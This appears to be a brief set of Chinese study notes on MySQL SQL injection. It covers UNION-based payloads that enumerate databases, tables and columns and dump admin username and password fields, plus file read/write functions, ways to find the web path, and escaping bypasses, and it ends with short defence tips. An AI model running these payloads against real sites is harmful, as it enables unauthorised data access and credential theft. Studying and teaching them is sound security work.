**高权限注入以及低权限注入**

1.跨库查询

  information_schema 表特性 记录表名，列名，库名

> 获取数据库名：
>
>   www.xxx.com/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata
>
> 获取指定数据库名下的表的信息：
>
> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='数据库名'
>
> 获取指定数据库下的表名为admin下的列名信息：
>
> union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='admin' and table_schema='数据库名' 
>
> 获取指定‘数据库’下的admin数据：
>
> union select 1,u,p,4 from 数据库名.admin
>
> 

#文件读写操作（mysql独特的内置函数）

load_file():  读取函数

into outfile ‘ 内容’  或者 into dumpfile ‘  ’:  导出函数

#获取网站路径的相关方法：

报错显示，遗留文件（phpinfo），漏洞报错，平台配置文件报错（my.ini,php.ini;路径很难确定)，爆破

在我们得到路径之后，可以用函数读取文件的数据；

#常见文件写入的问题：

magic_quotes_gpc 是否开启/关闭------转义开关；在遇到字符转义时，可以采用编码或者宽字节进行绕过

#如何防御sql注入呢？

添加过滤函数；进行输入的判断；自定义关键字过滤（大小写过滤，符号等）；WAF防护软件（安全狗，宝塔，阿里云）。